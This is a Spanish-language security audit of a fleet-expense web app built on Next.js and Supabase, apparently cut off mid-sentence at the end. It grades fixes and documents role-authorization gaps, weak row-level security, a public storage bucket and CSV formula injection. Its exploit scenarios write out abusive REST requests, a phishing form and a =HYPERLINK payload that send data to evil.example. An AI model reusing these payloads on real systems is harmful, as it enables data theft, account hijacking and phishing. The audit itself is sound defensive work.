# Seguridad — auditoría 11 (pase 2)

**Nota: 6/10** (antes 5). Razón del movimiento: **se atacó y subió — de verdad y
en el camino que corre**, y la deuda cobró factura en dos frentes que no se
tocaron. Verifiqué mis trece hallazgos del pase 1 uno por uno contra el árbol de
hoy: **siete están cerrados y lo puedo probar con la línea**, dos siguen
íntegros, y aparecieron dos costuras nuevas que los propios arreglos abrieron.

Lo que subió, y no es prosa: el rail del asistente hoy tiene **dos capas
independientes** (`chrome.tsx:113` no lo monta y `asistente/route.ts:60` no lo
sirve); las dos rutas de export llaman a `puedeExportar` **en el servidor**
(`liquidaciones/route.ts:29`, `pdf/[id]/route.ts:41`); `GET /api/demo` ya pide
superadmin (`demo/route.ts:25`); `/acceso` y `passcode.ts` **están borrados del
árbol**, no solo documentados; `mapa` y `soporte` llaman a `exigirVerRuta`; el
autoregistro por Google se cierra **en el único punto por el que pasan los dos
caminos** (`auth/callback/route.ts:31`); y `crearIncidencia`/`marcarPodPedido`
comprueban la pertenencia del viaje (`operacion.ts:678-680`, `:377-378`). Nada
de eso es un archivo que exista: seguí la cadena hasta el consumidor real en los
siete.

No sube más por dos cosas. **La primera es un CRÍTICO nuevo que anula el
titular del arreglo `2fb1982`:** el rail dejó de servirle las finanzas de la
flota al jefe de tráfico, pero `/dashboard/chat` —la MISMA caja, con los MISMOS
`kpis`/`acred`, a pantalla completa— sigue clasificada como `'operacion'` y
sigue en su sidebar. Se cerró la ventana y quedó la puerta. **La segunda es que
`supabase/migrations/` no se tocó:** la RLS del chofer cubre 3 de 7 tablas, y
ahora `permisos.ts:10` afirma por escrito que una migración `0048` arregló al
contador — esa migración **no existe en este repo**.

No baja de 5 porque lo del pase 1 se sostiene y lo volví a recorrer: **no hay un
solo camino sin autenticar a datos de un tenant**, el aislamiento entre flotas
no se rompe por ningún lado, `?rol=` no escala, `?tenant=` solo lo honra
superadmin contra un uuid que existe, y ningún secreto tiene fallback derivado.

**El riesgo mayor del rubro hoy:** la autorización por rol se sigue decidiendo
pantalla por pantalla, y el guardarraíl que debía atar esa tabla a la realidad
(`visibilidad_dinero.test.ts:32`) busca `mxn(` **en el `page.tsx`** — así que
cualquier pantalla que delegue el formateo a un componente pasa la prueba
enseñando pesos.

---

## Hallazgos

### [CRÍTICO] `/dashboard/chat` le contesta al `encargado` cuánto lleva comprobado la flota y cuánto IVA acredita — desde su propio sidebar, con un botón ya escrito

`src/lib/auth/visibilidad.ts:72` · `src/app/dashboard/chat/page.tsx:41,46-48,63` ·
`src/app/dashboard/chat.tsx:15-20,57-58,69-70,72-73` · `src/app/dashboard/rutas.ts:19` ·
(el guardarraíl que no lo ve) `src/lib/auth/visibilidad_dinero.test.ts:32,76`

`AREA_POR_RUTA` clasifica `'/dashboard/chat': 'operacion'` (`visibilidad.ts:72`),
que es exactamente el área del `encargado` (`:41`). La página no gatea nada más:

```ts
const { tenantId } = await resolverTenantEfectivo('/dashboard/chat', sp);   // :41
const [kpis, acred] = await Promise.all([
  safe<DashboardKpis>(() => getKpis(tenantId, null)),                        // :46
  safe<Acreditables>(() => getAcreditables(tenantId, null)),                 // :47
]);
…
<ChatFlota kpis={kpis} acred={acred} />                                      // :63
```

`null` como ventana es **todo el histórico de la flota**. Y `ChatFlota` es el
mismo componente que el rail: `responder()` (`chat.tsx:57-73`) devuelve el
comprobado, el IVA acreditable y el peaje acreditable en pesos.

**Escenario, con valores.** Ana, `encargado` (jefe de tráfico) de Transportes
Innovativos, entra por `/login`. `resolverTenantEfectivo` hace bien su trabajo y
la raíz le sirve `InicioOperacion` —cero pesos en pantalla (`page.tsx:332-333`)—.
En su sidebar, la sección **"Inicio"** tiene tres links (`rutas.ts:17-19`); dos
son de área `'dinero'` y `SidebarNav` se los quita, así que le queda **uno solo**:
**"Chatea con tus Datos"**. Lo abre. Los botones ya vienen escritos
(`chat.tsx:15-20`). Pulsa el primero, **"¿Cuánto llevo comprobado?"**, sin
teclear nada:

- → `chat.tsx:58` → **«Llevas $1,847,300.00 comprobados en 39 viajes (todo el histórico).»**
- «IVA» → `chat.tsx:70` → **«$118,420.00 de IVA acreditable en todo el histórico (LIVA, Art. 5).»**
- «peaje» → `chat.tsx:73` → **«$64,900.00 de peaje acreditable (50%) en todo el histórico.»**
- «tasa» → `chat.tsx:67` → la tasa de cuadre de la flota.

Es **el mismo dato, del mismo componente**, que `2fb1982` y `chrome.tsx:113`
acaban de cerrar en el rail. Con la sesión de Ana no hace falta ni `curl`.

**Consecuencia.** El entregable de la ronda —«el jefe de tráfico deja de ver las
finanzas»— es falso por el camino por defecto. Y para el 6-ago es peor que no
tener la función: si el contralor pide *«enséñame qué ve mi jefe de tráfico»*,
que es la demo natural de `visibilidad.ts`, el único link que le queda a ese rol
en la sección Inicio es el que le dice el comprobado y el IVA de toda la
empresa. El repo se contradice a sí mismo a un clic: `despacho/page.tsx:41-44`
declara de este mismo rol *«NO hay una sola cifra de dinero en esta pantalla, y
no es un descuido»*.

**Por qué la suite no lo vio (y esto es la mitad del hallazgo).**
`visibilidad_dinero.test.ts` se escribió justo para atar `AREA_POR_RUTA` al
render, pero mide con `PINTA_DINERO = /formato="mxn"|\bmxn\(/` sobre el fuente
del **`page.tsx`** (`:32,76`). `chat/page.tsx` no contiene `mxn(` en ninguna
línea: el formateo vive en `chat.tsx`, que es el componente. El trinquete pasa
en verde y su tercer caso (`:92-95`) afirma que «solo `/dashboard/operadores`
sigue abierta».

**Causa raíz.** El área se clasificó por la sección del sidebar («Inicio») y el
guardarraíl que debía corregir eso solo ve un archivo por ruta, no el árbol de
componentes que esa ruta monta.

---

### [CRÍTICO, REINCIDENTE de las rondas 10 y 11-pase1] La RLS del chofer sigue cubriendo 3 de 7 tablas: `operador`, `terminal`, `politica_gasto` y `wa_conversacion` le dan lectura **y escritura**

`supabase/migrations/0045_rls_operador.sql:39` · `supabase/migrations/0001_init.sql:110,114-116` ·
`supabase/migrations/0047_operacion_encargado.sql:170` · `src/lib/cuadra/conv.ts:60-75`

Reverificado línea por línea sobre el árbol de hoy, sin cambio. La 0045
reescribe `tenant_data` **solo** para `array['viaje', 'gasto', 'liquidacion']`
(`:39`). Las otras cuatro del bucle de `0001:110` conservan la policy original:

```sql
create policy tenant_data on %I for all
using (tenant_id = any(get_user_tenant_ids()) or is_superadmin())   -- 0001:115
```

sin `and not is_operador()`. Ninguna migración posterior las alcanza: la 0047
aplica el molde nuevo **solo a las tablas nuevas** (`:170`), y
`supabase/migrations/` termina en `0047`.

**Escenario, con valores.** Rubén, `operador` de la flota A, copia su access
token de la cookie `sb-<ref>-auth-token`; la `apikey` es la anon key, pública por
diseño.

```
GET https://<ref>.supabase.co/rest/v1/wa_conversacion?select=telefono,estado
Authorization: Bearer <su access token>
```
→ `200` con el **teléfono y la conversación íntegra de WhatsApp de todos sus
compañeros** — `wa_conversacion.estado` guarda `{ turns: ConvTurn[] }`, la
ventana rodante de mensajes (lo documenta `admin/negocio.ts:310-316`). Es
exactamente lo que `bc7fc86` acaba de sacar de `/admin` seudonimizándolo, servido
en crudo por la otra puerta.

Y escritura:
```
PATCH https://<ref>.supabase.co/rest/v1/operador?id=eq.<uuid de otro chofer>
{"telefono":"+5215588887777"}
```
→ `204`. `resolveOperador` (`conv.ts:61-65`) resuelve por `telefono` con
`.eq('activo', true)` y nada más: desde ese instante el segundo celular de Rubén
**es** el compañero. Manda fotos de gasto contra el viaje del otro y recibe su
PDF, con su nombre y sus montos. La versión que tumba el demo es una línea:
`PATCH /rest/v1/operador?tenant_id=eq.<A>` con `{"activo": false}` deja a la
flota entera sin poder mandar comprobantes por WhatsApp.

**Consecuencia.** Teléfono personal y transcripción completa de todos los
choferes legibles por cualquier compañero con cuenta, e identidad de WhatsApp
reescribible. Es el hallazgo que el aviso de privacidad promete que no pasa.

**Causa raíz.** La 0045 razonó tabla por tabla desde «¿esto lo pinta alguna
pantalla del chofer?» en vez de «¿qué le entrega PostgREST a un JWT con
`rol=operador`?». El arreglo existe en el PR #7 (`0046_rls_operador_resto.sql`)
y sus ordinales chocan con `master`.

---

### [ALTO] `puedeExportar` sigue incluyendo a `encargado` — así que las dos rutas que `489ff54` acaba de gatear le entregan a él justo lo que `visibilidad.ts` le quitó

`src/lib/auth/permisos.ts:21` · `src/app/api/export/liquidaciones/route.ts:29,53` ·
`src/app/api/export/pdf/[id]/route.ts:41,69` · (contra) `src/lib/auth/visibilidad.ts:41,89-91` ·
(origen) `supabase/migrations/0044_rol_encargado.sql:2-10`

Este es el defecto de costura: **dos arreglos correctos que juntos no lo son.**
`489ff54` puso el gate que faltaba —y lo puso bien, antes de leer y antes de
firmar—, pero lo puso contra un conjunto escrito **antes** de que existiera la
separación por área:

```ts
const EXPORTA = new Set(['superadmin', 'flota_admin', 'encargado', 'contador']);  // permisos.ts:21
```

`encargado` está ahí porque la 0044 lo definió como «ve todo el tenant como
`flota_admin`» (`0044:2-3`). La ronda 11 revirtió esa premisa: `visibilidad.ts:41`
le deja **solo** `'operacion'`, y G-26 movió `viajes`, `analitica` y `documentos`
a `'dinero'` (`:89-91`) precisamente porque pintaban pesos.

**Escenario, con valores.** Ana (`encargado`), con su sesión legítima del panel —
no ve ningún botón de exportar, porque `analitica` y `cuadre` son `'dinero'` y no
le abren:

```
curl -b "sb-<ref>-auth-token=…" https://app.likida.ai/api/export/liquidaciones
```
→ `200`, `Content-Disposition: attachment; filename="liquidaciones_likida.csv"`,
y **todas** las liquidaciones de la flota (ya no hay tope de 5,000: `traerTodo`
pagina hasta el final, `route.ts:49-58`), con las columnas
`folio_viaje, operador, fecha, total_comprobado, anticipo, diferencia, estatus,
num_diferencias` (`export.ts:4-13`). Con cualquier `id` de esa lista,
`GET /api/export/pdf/<id>` → `302` a la URL firmada del **ejemplar del
contralor**, el que lleva los veredictos (`pdf/[id]/route.ts:24-26,69`).

**Consecuencia.** El agujero que `visibilidad.ts` cerró en pantalla, abierto en
formato máquina y de un jalón, para el rol para el que ese archivo existe. Su
propia cabecera lo dice: «enseñarle el margen de la flota no es un detalle de UI,
es exponerle a un puesto medio las finanzas completas de la empresa».
`/api` está fuera del matcher del proxy (`proxy.ts:108`) y la consulta corre con
service-role: esa línea es la única capa.

**Causa raíz.** `permisos.ts` y `visibilidad.ts` responden dos preguntas
distintas sobre el mismo rol y nadie las reconcilió cuando la segunda cambió de
opinión; el gate nuevo importó el conjunto viejo sin releerlo.

---

### [ALTO, REINCIDENTE y agravado] El `contador` se vende como «solo lectura» y la base le da escritura sobre once tablas — y ahora el módulo de auth afirma una migración `0048` que no existe

`src/lib/auth/permisos.ts:8-11` · `supabase/migrations/` (termina en `0047`) ·
`supabase/migrations/0001_init.sql:110,114-116` · `supabase/migrations/0047_operacion_encargado.sql:170,183` ·
`src/app/dashboard/usuarios/page.tsx:27` · `src/app/admin/usuarios/nuevo/page.tsx`

La cabecera de `permisos.ts` fue reescrita esta ronda y hoy afirma:

```
//   · contador                             → SOLO lectura (0048, contador_lee)   // :10
```

**`0048` no está en el repo.** `ls supabase/migrations/` termina en
`0047_operacion_encargado.sql`, y `grep -rn "contador_lee" supabase/` no
devuelve una sola línea. La realidad de la base sigue siendo la de la 0001: el
bucle de `:110` crea `tenant_data … for all` sobre siete tablas sin mirar el rol,
y la 0047 reprodujo el mismo molde para `unidad`/`mantenimiento`/`incidencia`
(`:170`) y `pod` (`:183`), donde la única exclusión es `is_operador()`. Son once
tablas con escritura completa para el contador.

**Escenario, con valores.** Marisol, contadora externa de la flota A, con su
sesión legítima del panel:

```
DELETE https://<ref>.supabase.co/rest/v1/liquidacion?id=eq.<uuid>
Authorization: Bearer <su access token>
```
→ `204`. La liquidación desaparece del panel, del CSV y del PDF descargable, sin
`logger`, sin fila de auditoría y sin trigger que lo impida (la 0036/0042 cubren
INSERT y UPDATE de `gasto`, no DELETE de `liquidacion`).
`DELETE /rest/v1/pod?tenant_id=eq.<A>` borra la evidencia de entrega de toda la
flota — justo lo que `operacion.ts:392-394` dice que no se debe poder borrar.

**Consecuencia.** Una separación de funciones que el producto promete por
escrito en dos pantallas (`dashboard/usuarios/page.tsx:27`: «Solo lectura de lo
fiscal, con exportaciones») y que ninguna capa de servidor sostiene. Es lo
primero que pide demostrar un auditor interno. **Empeoró respecto del pase 1:**
antes la promesa estaba en la UI; ahora está en el módulo de autorización,
citando un número de migración, que es donde el siguiente agente va a leerla y
creerla.

**Causa raíz.** La misma trampa del PR #7: **llegó la prosa, no el SQL.**

---

### [ALTO] «Ver como jefe de tráfico» miente en la pieza más visible: el rail de dinero se queda montado, porque el marco usa el rol REAL y el sidebar el previsualizado

`src/app/dashboard/chrome.tsx:113` · `src/app/dashboard/layout.tsx:30` ·
`src/app/dashboard/sidebar-nav.tsx:105` · `src/lib/auth/tenant-efectivo.ts:112-113` ·
`src/app/dashboard/aviso-rol.tsx:44-45` · `src/app/api/dashboard/asistente/route.ts:60`

La regla de `?rol=` está escrita **tres veces y no da lo mismo**:

| dónde | con qué rol decide |
|---|---|
| la página (`tenant-efectivo.ts:112`) | `rolEfectivo(real, sp.rol)` → **previsualizado** |
| el sidebar (`sidebar-nav.tsx:105`) | `rol==='superadmin' && rolVista ? rolVista : rol` → **previsualizado** |
| **el rail** (`chrome.tsx:113`) | `puedeVerArea(rol, 'dinero')` con el `rol` que le pasa `layout.tsx:30`, que es `sesion.rol` → **REAL** |
| el endpoint del rail (`asistente/route.ts:60`) | `sesion.rol` → **REAL** (ni lee `?rol=`) |

**Escenario, con valores.** Javier (superadmin) abre
`app.likida.ai/dashboard?tenant=<uuid de Innovativos>&rol=encargado` desde
`/admin/flotas`. La cinta le anuncia: *«Estás viendo el panel como **Jefe de
tráfico**. Solo cambia lo que se te enseña, no lo que puedes hacer»*
(`aviso-rol.tsx:44-45`). El centro obedece: `InicioOperacion`, cero pesos. El
sidebar obedece: sin Viajes, sin Analítica, sin Cuadre. **Y a la derecha, en la
misma pantalla, el rail sigue ahí** con «Tasa de cuadre 87% — 34 de 39 cerraron
sin diferencias», y su chat contesta «Llevas $1,847,300.00 comprobados».

**Consecuencia.** Es la demo que el contralor va a pedir el 6-ago —«enséñame qué
ve cada quien»— y la pantalla se desmiente sola a diez centímetros de la cinta
que promete lo contrario. No es escalada de privilegios (la sesión real es
superadmin y ya podía ver todo), pero es la función de separación de roles
fallando **delante del comprador**, en la única superficie donde se puede
verificar.

**Causa raíz.** `rolEfectivo` vive en el servidor y el layout no recibe
`searchParams`; en vez de propagarlo, la regla se copió a mano donde hacía falta
y el marco se quedó con el rol crudo. (La copia de `sidebar-nav.tsx:105` además
omite el conjunto `PREVISUALIZABLES` de `visibilidad.ts:124`: con
`?rol=operador` el servidor ignora el parámetro y el sidebar se queda **vacío**.)

---

### [MEDIO, REINCIDENTE] El bucket `avatares` sigue público, sin tope de tamaño ni de MIME, y escribible por cualquier autenticado — el arreglo G-33 solo cubrió la ruta de la app

`supabase/migrations/0046_perfil_avatar.sql:17-19,28-30,44-45` ·
(el arreglo que no llega ahí) `src/app/admin/mi-perfil/avatar-validacion.ts:27-38` ·
`src/app/admin/mi-perfil/acciones.ts:45`

Esta ronda cerró bien **la mitad de la app**: `validarAvatar` impone lista blanca
de tres MIME y 4 MB, y ya no toma la extensión del nombre del cliente. Pero la
0046 no se tocó, y la policy no mira el rol ni el tenant, solo la carpeta:

```sql
insert into storage.buckets (id, name, public) values ('avatares','avatares', true)  -- :17-19
create policy "avatares_propio_insert" on storage.objects for insert to authenticated
  with check (bucket_id='avatares' and (storage.foldername(name))[1] = auth.uid()::text)  -- :28-30
create policy "avatares_lectura_publica" … for select to public                       -- :44-45
```

`file_size_limit` y `allowed_mime_types` quedan `null` = sin límite y cualquier
MIME.

**Escenario, con valores.** Rubén (`operador`, flota A) **no pasa por la app** —
`/admin/mi-perfil` es solo de superadmin, así que `validarAvatar` nunca corre
para él. Usa la API de Storage con su token:

```
POST https://<ref>.supabase.co/storage/v1/object/avatares/<su auth.uid>/aviso.html
Authorization: Bearer <su access token>
Content-Type: text/html
<form action="https://evil.example/robar">…Ingresa tu contraseña de Likida…</form>
```
→ `200`. La policy pasa (la carpeta es su propio uid) y el archivo queda servido
**sin sesión** en `…/object/public/avatares/<uid>/aviso.html` con el
`Content-Type` que él eligió. El mismo `POST` con 2 GB también pasa.

**Consecuencia.** Alojamiento de contenido arbitrario servido sin autenticar bajo
el dominio de Supabase del proyecto — el sitio ideal para un phishing dirigido a
los propios operadores de las flotas. Y egress sin techo, facturable al
proyecto. Lo dejo en MEDIO y no en ALTO porque exige una cuenta dada de alta.

**Causa raíz.** El arreglo se puso en el server action porque ahí es donde había
código; el bucket admite lo que la policy admite, y la policy no cambió.

---

### [MEDIO] Dos de los tres caminos de suplantación de tenant siguen sin dejar una línea, y siguen descartando el `error` — el arreglo G-34 no llegó a sus copias

`src/lib/auth/tenant-efectivo.ts:46-74` (el arreglado) · (sin arreglar)
`src/app/api/dashboard/asistente/route.ts:45-48` · `src/app/dashboard/[id]/page.tsx:60-66`

`flotaSuplantada` quedó bien: usa `exigir()` para fallar cerrado y escribe
`logger.info('tenant.suplantacion', { userId, tenant, ruta })` (`:70-72`). Eso
cierra la mitad del MEDIO del pase 1. Pero hay **tres** sitios que honran
`?tenant=` y los otros dos conservan el patrón viejo:

```ts
const { data: t } = await supabaseAdmin().from('tenant').select('id, nombre')
  .eq('id', pedido).maybeSingle();          // asistente/route.ts:46 — y [id]/page.tsx:61
```

`grep -n "logger" src/app/api/dashboard/asistente/route.ts src/app/dashboard/[id]/page.tsx`
→ **cero líneas**: ninguno de los dos importa el logger.

**Escenario, con valores.** Javier abre
`app.likida.ai/dashboard/<uuid de liquidación>?tenant=<uuid de Innovativos>` (el
link que la tabla del panel ya construye). Ve el detalle completo: comprobado
contra anticipo, deducibilidad, desglose de IVA/IEPS, nombre del chofer, y el
botón de descargar el PDF. En los logs no queda **nada** — la línea de auditoría
solo existe para las páginas que pasan por `resolverTenantEfectivo`, y ésta no.
Igual el rail, que consulta con `?tenant=` en cada navegación. Si el contralor de
Innovativos pregunta «¿quién de ustedes abrió mi liquidación el martes?», la
respuesta es incompleta y no se nota que lo es.

Además el `const { data } = …` de las dos copias es el patrón que
`pg.ts:9-21` llama «la familia de bugs más repetida del repo»: con un 503
transitorio, `data` sale `null`, el `if` no entra y se sigue con el tenant de la
sesión — que para un superadmin es el **demo**. La cifra que sale es de otra
flota y la pantalla no lo dice.

**Causa raíz.** El arreglo se centralizó en `tenant-efectivo.ts` sin recorrer a
los otros dos consumidores del mismo parámetro.

---

### [MEDIO] El CSV que el contralor abre en Excel no neutraliza fórmulas, y el `folio` lo teclea el encargado

`src/lib/cuadra/export.ts:39-42,44-52` · `src/app/dashboard/despacho/page.tsx:120` ·
`src/lib/cuadra/operacion.ts:585` · `src/app/api/export/liquidaciones/route.ts:67-68`

```ts
function csvCell(v: unknown): string {
  const s = v == null ? '' : String(v);
  return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;   // export.ts:39-42
}
```
Solo entrecomilla; una celda que empieza por `=`, `+`, `-` o `@` sale tal cual.
Excel, LibreOffice y Sheets la evalúan como fórmula al abrir.

**Escenario, con valores.** Ana (`encargado`) da de alta un viaje en
`/dashboard/despacho` y en el campo **Folio** escribe
`=HYPERLINK("https://evil.example/?f="&A2&B2,"VJ-2026-0912")`. El valor viaja sin
tocarse: `formData.get('folio')` (`despacho/page.tsx:120`) →
`crearViaje` (`operacion.ts:585`) → columna `viaje.folio` → `toLiquidacionRows`
la copia a `folio_viaje` (`export.ts:67`) → `toCsv` la emite cruda. El contralor
descarga `liquidaciones_likida.csv` desde Analítica y lo abre: ve un folio
normal, y al hacer clic manda a un servidor ajeno el contenido de las celdas
vecinas — que son el comprobado y el anticipo de ese renglón.

**Consecuencia.** El export es *el* artefacto que sale de Likida hacia el ERP y
el contador de la flota. Un CSV que ejecuta lo que un puesto medio tecleó es
exfiltración con la firma del producto encima. (El mismo campo `operador` es
escribible por cualquier chofer vía el CRÍTICO de RLS de arriba, lo que encadena
los dos.)

**Causa raíz.** `csvCell` resuelve el escapado de RFC 4180 (comas y comillas) y
lo confunde con neutralizar la celda.

---

### [BAJO, REINCIDENTE] `try_lock_viaje` y `unlock_viaje`: el `revoke … from public` no alcanza el grant explícito de Supabase, y el repo lo tiene escrito al revés en dos sitios

`supabase/migrations/0012_seguridad_rls.sql:11-14` · (lo correcto, 42 líneas después)
`0013_guardar_liquidacion_tx.sql:51-55` · `0031_intake_barrera_ttl.sql:83` ·
`supabase/verificaciones.sql:614-615,625-627`

Sin cambio. La 0012 revoca de `public` y explica el porqué al revés: *«las
funciones se otorgan a PUBLIC por defecto (revocar solo de anon NO basta)»*
(`:11-12`), y `verificaciones.sql:614-615` lo remata: *«`revoke … from anon` NO
basta y por eso se revoca de PUBLIC»*. En Supabase no es herencia: el
`alter default privileges` del proyecto concede `execute` **explícitamente** a
`anon` y `authenticated`. La 0013 lo escribe correcto (`:51-53`, y revoca de
`public, anon, authenticated`) y la 0031 corrigió así `intake_delta` (`:83`); las
dos del mutex nunca se corrigieron — la 0035 solo les puso `search_path`, que no
toca grants.

**Escenario, y lo que lo cierra.** `POST /rest/v1/rpc/unlock_viaje` con la anon
key no responde «función no encontrada»: el EXECUTE está. Pero **lo intenté por
los dos lados y no cierra**: ninguna de las dos es `security definer`
(`0005:31-50`, confirmado además por el encabezado de `0035:7-10`), el cuerpo
corre como el llamador, y `viaje_lock` tiene RLS encendida **sin una sola policy**
(`0005:27`). El `delete` afecta 0 filas y el `insert … on conflict` sale con
`42501`. La segunda capa sostiene, para `anon` y para `authenticated`.

**Consecuencia.** Ninguna práctica hoy: defensa en profundidad perdida. Lo que
reporto es que el repo **cree** cerrada una puerta que no lo está, lo dejó
escrito dos veces, y su propio verificador lo delataría —el bloque 16
(`verificaciones.sql:625-627`) imprime `anon-lock`/`anon-unlock` con «esperado f»
y contra la base real saldría `t`—, pero es un `raise exception` manual que nadie
corre. Y ese bloque solo pregunta por `anon`, nunca por `authenticated`.

---

### [BAJO] Sin CSP, quinta ronda — y ahora con un sitio propio donde alojar el payload

`src/proxy.ts:26-35` · `next.config.ts` · (el sitio) `supabase/migrations/0046_perfil_avatar.sql:17-19`

`withSecurityHeaders` pone `nosniff`, `X-Frame-Options: DENY`,
`Referrer-Policy`, `Permissions-Policy` y HSTS en producción, y —bien— se aplica
en un solo punto al final **y** al objeto de redirección (`proxy.ts:99,104`), con
`no-store` en las rutas gateadas (`:101`). Lo que no hay, en ninguno de los dos
archivos, es `Content-Security-Policy`:
`grep -rn "Content-Security-Policy" src/ next.config.ts` → cero.

**Escenario.** No tengo un sumidero de XSS confirmado en este árbol (no alcancé a
recorrer `privacidad/page.tsx` con el detalle que merece), así que esto es
superficie, no explotación — por eso BAJO y no MEDIO. Lo anoto porque el MEDIO
del bucket público le da a un atacante un lugar donde alojar el payload **bajo un
dominio del proyecto**, que es la mitad que solía faltarle a este hallazgo.

---

## Lo que revisé y está bien

**Los siete cierres del pase 1, verificados en el camino que corre — no en un
archivo que exista:**

1. **El rail ya tiene DOS capas.** `chrome.tsx:113` no lo monta
   (`puedeVerArea(rol,'dinero') && <RailAsistente />`, con el criterio escrito
   como «¿ve dinero?» y no «¿es encargado?»), y `asistente/route.ts:60` no lo
   sirve —niega **antes** de consultar y discrimina el motivo (`:89`) en vez de
   devolver un `null` ambiguo—. Seguí la cadena `layout.tsx:30 → chrome.tsx:113
   → rail.tsx:71 → route.ts:60`. Cierra el CRÍTICO nº1 del pase 1 **para el
   rail**; lo que queda abierto es `/dashboard/chat`, que es otra puerta.
2. **Las dos rutas de export autorizan de verdad.**
   `liquidaciones/route.ts:29` y `pdf/[id]/route.ts:41` llaman a `puedeExportar`
   con la sesión, cortan **antes** de leer la fila y de firmar, responden 403 (no
   404, porque la sesión ya existe) y dejan `logger.warn`. El defecto que queda
   es el conjunto, no la capa (ALTO de arriba).
3. **`GET /api/demo` ya no publica el inventario de configuración.**
   `demo/route.ts:24-25`: `if (s?.rol !== 'superadmin') return 404`. **404 y no
   401**, que es lo correcto: un 401 confirma que la ruta existe. Cierra un BAJO
   reincidente de las rondas 8, 9, 10 y 11-pase1.
4. **`/acceso` y `passcode.ts` están BORRADOS**, no documentados:
   `ls src/app/acceso` → no existe; `find src -name "passcode*"` → vacío. La
   segunda pantalla de login con otro branding ya no se puede teclear el 6-ago.
5. **`/dashboard/mapa` y `/dashboard/soporte` ya llaman a `exigirVerRuta`**
   (`mapa/page.tsx:11`, `soporte/page.tsx:11`). Recorrí las **24** páginas de
   `/dashboard`: 16 pasan por `resolverTenantEfectivo`, 6 por `exigirVerRuta`, y
   `/dashboard/[id]` —la dinámica, que no cabe en el mapa— comprueba el área **a
   mano** (`[id]/page.tsx:49`) y repite `puedeAsignar` **dentro** del server
   action (`:81-82`). Ninguna se quedó con el matcher como única capa.
6. **El autoregistro por Google está cerrado en el camino que corre.**
   `auth/callback/route.ts:31` llama a `revertirAltaEspontanea()` y, si revirtió,
   redirige a `/sin-acceso` — es el único punto por el que pasan magic link y
   Google. `autoregistro.ts:55-80` pregunta con service-role (para que una policy
   mal escrita no borre una cuenta buena) y **no** revierte si no pudo comprobar
   (`:57-63`): fallar abierto aquí es lo correcto y está razonado.
7. **`crearIncidencia` y `marcarPodPedido` ya comprueban la pertenencia.**
   `operacion.ts:678-680` y `:377-378` llaman a `exigirDelTenant`, que consulta
   `id + tenant_id` y lanza `ErrorDeCaptura('ajeno')` (`:554-561`). Cierra el BAJO
   del pase 1; `crearViaje` (`:580-582`) y `crearUnidad` heredan el mismo patrón.

**La trampa del PR #7 no se repitió en `/login`.** `login/page.tsx:2` importa
`entrarConGoogle`/`entrarConEmail` de `./acciones` y **esas** son las que montan
los dos `<form>` (`:65`, `:85`); no queda una sola copia inline, y
`una_sola_copia.test.ts` lo ancla. `acciones.ts:96` conserva
`shouldCreateUser:false` y `:99-118` responde **lo mismo** al correo con cuenta y
al que no la tiene (`&enviado=1`), incluido el exceso de límite (`:83-85`, que
sale por `error=1` genérico y no por «vas muy rápido»): el oráculo de enumeración
está cerrado.

**El aislamiento entre flotas se sostiene — lo recorrí otra vez, entero.**
`flotaSuplantada` (`tenant-efectivo.ts:53`) devuelve `null` sin consultar nada si
el rol real no es `superadmin`, y comprueba el uuid contra la tabla antes de
usarlo; un `flota_admin` con `?tenant=<otra flota>` no mueve una cifra por
ninguno de los tres caminos. `?rol=` **solo puede restar**: `rolEfectivo`
(`visibilidad.ts:142-146`) lo honra únicamente si el rol real es `superadmin` y
solo contra `PREVISUALIZABLES` (`:124`), que no incluye `superadmin` ni
`operador`. Los server actions **vuelven a resolver el tenant desde la sesión** en
vez de confiar en el closure del render (`despacho/page.tsx:84-88`,
`tenant-efectivo.ts:84-92`), que es exactamente el borde donde esto se rompe.

**`/admin` está detrás de autorización real.** `requireSuperadmin()` en
`admin/layout.tsx:36` envuelve toda página descendiente, y **no existe ningún
`route.ts` bajo `src/app/admin/`** (`find src/app -name route.ts` → los seis que
hay están bajo `api/` y `auth/callback`) — que es la forma en que un layout deja
de proteger a su hermana. Los server actions repiten la comprobación adentro
(`mi-perfil/acciones.ts:27,44`). Sigue siendo **una** capa de rol, pero es una
capa de verdad. Y `bc7fc86` cerró bien la fuga de PII: `getConversacionesActivas`
(`negocio.ts:317-337`) convierte el teléfono a seudónimo **en el borde** —«si
saliera del módulo aunque fuera una vez, la siguiente pantalla lo pintaría»— y
redacta correo/RFC/CURP/teléfono del texto (`:303-306`), declarando por escrito
que no es anonimización irreversible.

**Secretos: ninguno con fallback derivado, cuarta ronda igual.**
`supabaseAdmin()` lanza sin `SUPABASE_SERVICE_ROLE_KEY`; `verifySignature`
devuelve `false` sin `WHATSAPP_APP_SECRET` (`meta/client.ts:41-42`, fail-closed)
y compara con `timingSafeEqual` tras igualar longitudes (`:44-46`);
`verifyWebhookChallenge` (`:31-37`), igual. `env.ts:49-56` devuelve **nombres,
nunca valores**. El único valor con default literal es `DEMO_TENANT_ID`
(`guard.ts:25`, `asistente/route.ts:30`) y no es un secreto. El fallback de
`siteUrl()` a `https://likida.ai` (`login/acciones.ts:32`) **no** es un secreto
derivado: es la decisión de dominio que el RESULTADO ya escaló, y
`observability/arranque.ts:53-55` la avisa en el arranque con la consecuencia
exacta.

**Webhook: límites de cuerpo y de tasa, correctos.**
`webhook/whatsapp/route.ts:42` mide `content-length` **antes** de leer y `:45`
vuelve a medir `raw.length` después — exactamente lo que `ratelimit.ts:88-93`
advierte que hay que hacer con `Transfer-Encoding: chunked`. HMAC antes de
parsear (`:46`). Rate limit por **teléfono**, no por IP (`:60`), que es lo
correcto porque todo Meta viene de sus IPs. El límite sigue siendo por instancia
y el módulo lo dice sin adornos (`ratelimit.ts:7-16`); la poda ahora es por
caducidad y no por orden de inserción (`:63-72`), que era un bug real de
liberación de bloqueos.

**La URL firmada del PDF sigue en 60 segundos, no en 3600.**
`export/pdf/[id]/route.ts:69` firma con `60` y `{download: …}`; cubre la vida del
302 y nada más. Los dos 404 son indistinguibles a propósito (`:63-65`).
`processor.ts:1663` también firma a 60 s. `ligaComprobante`
(`intake/almacen.ts:83`) tiene default de 3600, pero
`grep -rn "ligaComprobante" src/` no devuelve **ningún** consumidor: es código
muerto, no una URL viva. (Su docstring afirma «Una hora, igual que los PDF», y
los PDF son 60 s — prosa caducada, sin efecto.)

**Redirecciones abiertas: no hay, y ahora en un solo sitio.** `destinoSeguro`
(`auth/destino.ts:35-44`) sustituyó las cuatro copias de
`startsWith('/dashboard')` y cierra los tres huecos por escrito: `//evil.example`
(`:39`), `\r\n` en la cabecera `Location` (`:41`) y `'/dashboardevil'`
